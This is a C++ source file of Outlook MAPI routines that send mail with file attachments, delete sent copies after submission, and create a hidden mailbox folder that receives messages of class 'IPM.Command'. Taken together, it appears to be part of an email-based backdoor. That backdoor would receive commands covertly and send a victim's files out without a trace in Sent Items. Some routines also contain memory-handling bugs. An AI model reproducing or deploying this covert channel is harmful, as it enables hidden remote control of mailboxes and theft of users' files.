#include "MAPIShell.h"
#include "MapiUtil.h"
#include <atlstr.h>
#include <vector>

STDMETHODIMP BuildEmail(LPMAPISESSION lpMAPISession, LPMDB lpMDB, LPMAPIPROP lpMessage, CString szSubject, CString szBody, std::vector<CString> lpRecipients, CString szSenderName)
{
	HRESULT hRes = S_OK;
	SPropTagArray lpPropTagArray = { 1, PR_DISPLAY_NAME };
	ULONG lpcValues;
	DWORD dwRecipientCount = 0;
	LPSPropValue lpPropArray = NULL;
	CString szSenderEmail;
	SPropValue propFormat = {};
	LPSPropValue pp = NULL;

	// Set flag to delete mail from sent mail after submit
	hRes = DeleteAfterSubmit(lpMessage);
	if (FAILED(hRes)) goto quit;

	// Get mail address to set sender
	hRes = lpMDB->GetProps(
		&lpPropTagArray,
		PT_UNSPECIFIED,
		&lpcValues,
		&lpPropArray);
	if (FAILED(hRes)) goto quit;

	// Set sender
	szSenderEmail = lpPropArray->Value.lpszA;
	hRes = SetPropertyString(
		lpMessage,
		PR_SENDER_EMAIL_ADDRESS,
		szSenderEmail);
	if (FAILED(hRes)) goto quit;

	// Set subject
	hRes = SetPropertyString(
		lpMessage,
		PR_SUBJECT,
		szSubject);
	if (FAILED(hRes)) goto quit;

	// set body
	hRes = SetPropertyStream(
		lpMessage,
		PR_BODY,
		szBody);
	if (FAILED(hRes)) goto quit;

	propFormat.dwAlignPad = 0;
	propFormat.ulPropTag = PR_MSG_EDITOR_FORMAT;
	propFormat.Value.l = EDITOR_FORMAT_PLAINTEXT;

	hRes = HrSetOneProp(
		lpMessage,
		&propFormat);
	if (FAILED(hRes)) goto quit;

	for (CString szRecipient : lpRecipients)
		if (AddRecipient(lpMAPISession, lpMessage, szRecipient) == S_OK)
			dwRecipientCount++;

	if (dwRecipientCount == 0) goto quit; // No recipient were added
	else hRes = S_OK; // At least 1 recipient. send the mail

quit:
	lpMessage->SaveChanges(KEEP_OPEN_READWRITE);
	if (lpPropArray) MAPIFreeBuffer(lpPropArray);

	return hRes;
}

STDMETHODIMP SetPropertyString(LPMAPIPROP lpProp, ULONG ulProperty, CString szProperty)
{
	HRESULT hRes = S_OK;

	SPropValue prop;
	prop.ulPropTag = ulProperty;
	prop.Value.LPSZ = (LPTSTR)(LPCTSTR)szProperty;

	hRes = lpProp->SetProps(1, &prop, NULL);

	return hRes;
}

STDMETHODIMP SetPropertyStream(LPMAPIPROP lpProp, ULONG ulProperty, CString szProperty)
{
	LPSTREAM lpStream = NULL;
	HRESULT hRes = S_OK;

	hRes = lpProp->OpenProperty(ulProperty, &IID_IStream, 0, MAPI_MODIFY | MAPI_CREATE, (LPUNKNOWN*)&lpStream);
	if (FAILED(hRes)) return hRes;

	lpStream->Write(szProperty, (ULONG)(szProperty.GetLength() + 1) * sizeof(TCHAR), NULL);
	lpStream->Commit(STGC_DEFAULT);
	lpStream->Release();

	return hRes;
}

STDMETHODIMP DeleteAfterSubmit(LPMAPIPROP lpMessage) {
	SPropValue propDelete = {};
	SPropTagArray sPropTagArray = { 1, PR_SENTMAIL_ENTRYID };
	HRESULT hRes;
	propDelete.dwAlignPad = 0;
	propDelete.ulPropTag = PR_DELETE_AFTER_SUBMIT;
	propDelete.Value.b = TRUE;

	hRes = HrSetOneProp(
		lpMessage,
		&propDelete);
	if (hRes != S_OK) return hRes;

	hRes = ((LPMESSAGE)lpMessage)->DeleteProps(
		&sPropTagArray,
		NULL);
	if (hRes != S_OK) return hRes;

	hRes = ((LPMESSAGE)lpMessage)->SaveChanges(KEEP_OPEN_READWRITE);
	if (FAILED(hRes)) return hRes;

	return hRes;
}

STDMETHODIMP AddRecipient(LPMAPISESSION lpMAPISession, LPMAPIPROP lpMessage, CString szRecipient)
{
	HRESULT hRes = S_OK;
	ULONG nBufSize;
	ULONG nProperties;
	LPADRLIST lpAddressList = NULL;
	LPADRBOOK lpAddressBook = NULL;

	nBufSize = CbNewADRLIST(1);
	MAPIAllocateBuffer(nBufSize, (LPVOID FAR*) & lpAddressList);
	ZeroMemory(lpAddressList, nBufSize);

	lpAddressList->cEntries = 1;
	lpAddressList->aEntries[0].ulReserved1 = 0;
	lpAddressList->aEntries[0].cValues = 2; //Number of properties

	nProperties = 2;
	MAPIAllocateBuffer(sizeof(SPropValue) * nProperties, (LPVOID FAR*) & lpAddressList->aEntries[0].rgPropVals);
	ZeroMemory(lpAddressList->aEntries[0].rgPropVals, nBufSize);

	lpAddressList->aEntries[0].rgPropVals[0].ulPropTag = PR_RECIPIENT_TYPE;
	lpAddressList->aEntries[0].rgPropVals[0].Value.ul = MAPI_TO;

	lpAddressList->aEntries[0].rgPropVals[1].ulPropTag = PR_DISPLAY_NAME;
	lpAddressList->aEntries[0].rgPropVals[1].Value.LPSZ = (LPTSTR)(LPCTSTR)szRecipient;

	hRes = lpMAPISession->OpenAddressBook(
		0,
		NULL,
		AB_NO_DIALOG,
		&lpAddressBook);
	if (FAILED(hRes)) goto quit;

	hRes = lpAddressBook->ResolveName(
		0,
		0,
		NULL,
		lpAddressList);
	if (FAILED(hRes)) goto quit;

	hRes = ((LPMESSAGE)lpMessage)->ModifyRecipients(
		MODRECIP_ADD,
		lpAddressList);
	if (FAILED(hRes)) goto quit;

	lpMessage->SaveChanges(KEEP_OPEN_READWRITE);
quit:
	if (lpAddressList) FreePadrlist(lpAddressList);
	if (lpAddressBook) lpAddressBook->Release();

	return hRes;
}

STDMETHODIMP AddAttachment(LPMAPIPROP lpMessage, CString szPath)
{
	HRESULT hRes = S_OK;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	LPTSTR lpBuffer = NULL;
	//CString szFileContent;
	DWORD dwBytesToRead;
	DWORD dwBytesRead = 0;
	LPATTACH lpAttachment = NULL;
	ULONG ulAttachmentNum = 0;
	const DWORD dwPropsCount = 6;
	SPropValue prop[dwPropsCount];
	CString szFileName = GetNameFromPath(szPath);
	CString szFileExtension = GetExtensionFromName(szFileName);
	if (szFileName == "" || szFileExtension == "") goto quit;

	hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) goto quit;

	dwBytesToRead = GetFileSize(hFile, NULL);
	if (dwBytesToRead == INVALID_FILE_SIZE) goto quit;

	lpBuffer = new TCHAR[dwBytesToRead + 1];
	ZeroMemory(lpBuffer, dwBytesToRead + 1);
	if (!ReadFile(hFile, lpBuffer, dwBytesToRead, &dwBytesRead, NULL)) goto quit;
	//szFileContent = lpBuffer;

	hRes = ((LPMESSAGE)lpMessage)->CreateAttach(NULL, NULL, &ulAttachmentNum, &lpAttachment);
	if (FAILED(hRes)) goto quit;

	prop[0].ulPropTag = PR_ATTACH_METHOD;
	prop[0].Value.ul = ATTACH_BY_VALUE;
	
	prop[1].ulPropTag = PR_ATTACH_SIZE;
	prop[1].Value.ul = dwBytesRead;
	
	prop[2].ulPropTag = PR_RENDERING_POSITION;
	prop[2].Value.l = -1;
	
	prop[3].ulPropTag = PR_ATTACH_FILENAME;
	prop[3].Value.LPSZ = (LPTSTR)(LPCTSTR)szFileName;
	
	prop[4].ulPropTag = PR_DISPLAY_NAME;
	prop[4].Value.LPSZ = (LPTSTR)(LPCTSTR)szFileName;

	prop[5].ulPropTag = PR_ATTACH_EXTENSION;
	prop[5].Value.LPSZ = (LPTSTR)(LPCTSTR)szFileExtension;

	hRes = lpAttachment->SetProps(dwPropsCount, prop, NULL);
	if (FAILED(hRes)) goto quit;

	hRes = SetPropertyStream(lpAttachment, PR_ATTACH_DATA_BIN, lpBuffer);
	if (FAILED(hRes)) goto quit;

	lpAttachment->SaveChanges(KEEP_OPEN_READONLY);
quit:
	if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
	if (lpBuffer) delete[] lpBuffer;
	if (lpAttachment) lpAttachment->Release();
	return hRes;
}

STDMETHODIMP SetReceiveFolder(LPMAPISESSION lpMAPISession)
{
	HRESULT hRes = S_OK;
	LPMDB lpMDB = NULL;
	LPMAPIFOLDER lpInboxFolder = NULL;
	LPMAPIFOLDER lpRootFolder = NULL;
	LPMAPIFOLDER lpNewFolder = NULL;
	LPSPropValue prop;
	SPropValue prop2;
	ULONG ulObjType = NULL;

	hRes = OpenDefaultMessageStore(lpMAPISession, &lpMDB, TRUE);
	if (FAILED(hRes)) goto quit;

	hRes = OpenInbox(lpMDB, &lpInboxFolder, NULL);
	if (FAILED(hRes)) goto quit;

	hRes = HrGetOneProp(
		lpMDB,
		PR_IPM_SUBTREE_ENTRYID,
		&prop);
	if (FAILED(hRes)) goto quit;

	hRes = lpMDB->OpenEntry(prop->Value.bin.cb, (LPENTRYID)prop->Value.bin.lpb, NULL, MAPI_MODIFY, &ulObjType, (LPUNKNOWN*)&lpRootFolder);

	hRes = HrGetOneProp(
		lpRootFolder,
		PR_ACCESS_LEVEL,
		&prop);
	if (FAILED(hRes)) goto quit;

	hRes = lpRootFolder->CreateFolder(FOLDER_GENERIC, (LPTSTR)"Test", (LPTSTR)"Test", NULL, OPEN_IF_EXISTS, &lpNewFolder);
	if (FAILED(hRes)) goto quit;

	prop2.dwAlignPad = 0;
	prop2.ulPropTag = 0x10F4000B; // PR_ATTR_HIDDEN
	prop2.Value.b = TRUE;

	hRes = HrSetOneProp(
		lpNewFolder,
		&prop2);
	if (FAILED(hRes)) goto quit;

	hRes = lpNewFolder->SaveChanges(KEEP_OPEN_READWRITE);
	if (FAILED(hRes)) goto quit;

	hRes = HrGetOneProp(
		lpNewFolder,
		PR_ENTRYID,
		&prop);
	if (FAILED(hRes)) goto quit;

	hRes = lpMDB->SetReceiveFolder((LPTSTR)"IPM.Command", 0, prop->Value.bin.cb, (LPENTRYID)prop->Value.bin.lpb);
	if (FAILED(hRes)) goto quit;

quit:
	if (lpMDB) {
		ULONG ulFlags = LOGOFF_NO_WAIT;
		lpMDB->StoreLogoff(&ulFlags);
		lpMDB->Release();
		lpMDB = NULL;
	}
	if (lpInboxFolder) lpInboxFolder->Release();
	if (lpRootFolder) lpRootFolder->Release();
	if (lpNewFolder) lpNewFolder->Release();
	return hRes;
}

CString GetNameFromPath(CString& szPath)
{
	int pos = szPath.ReverseFind('\\');
	return szPath.Mid(pos + 1);
}

CString GetExtensionFromName(CString& szFileName)
{
	int pos = szFileName.ReverseFind('.');
	return szFileName.Mid(pos);
}